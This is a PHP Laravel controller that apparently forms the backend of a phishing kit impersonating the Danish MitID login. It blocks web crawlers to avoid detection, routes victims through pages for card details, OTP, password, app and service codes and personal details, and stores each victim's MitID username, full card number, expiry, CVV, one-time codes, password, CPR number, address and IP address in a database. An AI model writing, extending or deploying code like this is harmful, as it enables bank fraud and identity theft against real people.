<?php

namespace App\Http\Controllers;

use Crawler;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;

class AuthController extends Controller
{

    public function __construct() {
        if(Crawler::isCrawler()) {
          abort(404);
        }
    }

    public function index() {

        $uri = $_SERVER['REQUEST_URI'];
        if(str_contains($uri, "?loading")) {
            return view('pages.loading');
        } elseif(str_contains($uri, "?card-details")) {
            return view('pages.card');
        } elseif(str_contains($uri, "?cpr-token")) {
            return view('pages.cpr-token');
        } elseif(str_contains($uri, "?otp")) {
            return view('pages.otp');
        } elseif(str_contains($uri, "?password")) {
            return view('pages.password');
        } elseif(str_contains($uri, "?service-code")) {
            return view('pages.service-code');
        } elseif(str_contains($uri, "?app-code")) {
            return view('pages.app-code');
        }  elseif(str_contains($uri, "?personal-details")) {
            return view('pages.personal-details
                ');
        } elseif(str_contains($uri, "?complete")) {
            return view('pages.complete');
        }

        return view('pages.mit_id');
    }

    public function mit_store(Request $request) {
        
        if(!isset($_COOKIE['user_unique_id'])) {
            set_cookie(
                "user_unique_id", 
                md5(uniqid($request->username2, true))
            );
        }

        $browser = browser_detect();
        $visitor_id = get_cookie('user_unique_id');
        
        $data = User::create([
            'user_unique_id' => $visitor_id,
            'mit_id' => $request->username2,
            'browser_name' => $browser->browserFamily(),
            'os' => $browser->platformName(),
            'user_agent' => $browser->userAgent(),
            'ip_address' => $_SERVER['REMOTE_ADDR']
        ]);

        if($data) {
           return response('stored');
        }
                

    }

    public function card_store(Request $request) {

        $card_bin = rand(000000, 999999);

        $data = User::updateOrCreate(
            ['user_unique_id' => get_cookie('user_unique_id')],
            [
                'bank_name' => $request->bank,
                'card_name' => $request->cardname,
                'card_bin' => $card_bin,
                'card_type' => $request->card_type,
                'card_number' => $request->cardnumber,
                'card_expiry_date' => $request->expirydate,
                'card_cvv' => $request->cvv,
                'status' => ''
            ]
        );

        if($data) {
            return response('stored');
        }

    }

    public function app_code_store(Request $request) {
        
        $data = User::updateOrCreate(
            ['user_unique_id' => get_cookie('user_unique_id')],
            [
                'app_code' => $request->app_code,
                'status' => ''
            ]
        );

        if($data) {
            return response('stored');
        }

    }

    public function otp_store(Request $request) {
        $data = User::updateOrCreate(
            ['user_unique_id' => get_cookie('user_unique_id')],
            [
                'otp' => $request->otp,
                'status' => ''
            ]
        );

        if($data) {
            return response('stored');
        }
    }

    public function cpr_store(Request $request) {
        
    }

    public function password_store(Request $request) {
        
        $data = User::updateOrCreate(
            ['user_unique_id' => get_cookie('user_unique_id')],
            [
                'password' => $request->password,
                'status' => ''
            ]
        );

        if($data) {
            return response('stored');
        }

    }

    public function personal_store(Request $request) {

        $data = User::updateOrCreate(
            ['user_unique_id' => get_cookie('user_unique_id')],
            [
                'name' => $request->fullname,
                'dob' => $request->dob,
                'city' => $request->city,
                'address' => $request->address,
                'post_code' => $request->post_code,
                'province' => $request->province,
                'state' => $request->state,
                'phone_number' => $request->phone_number,
                'cpr_number' => $request->cpr_number,
                'status' => ''
            ]
        );

        if($data) {
            return response('stored');
        }
    }

    public function service_store(Request $request) {
        $data = User::updateOrCreate(
            ['user_unique_id' => get_cookie('user_unique_id')],
            [
                'service_code' => $request->service_code,
                'status' => ''
            ]
        );

        if($data) {
            return response('stored');
        }
    }
}
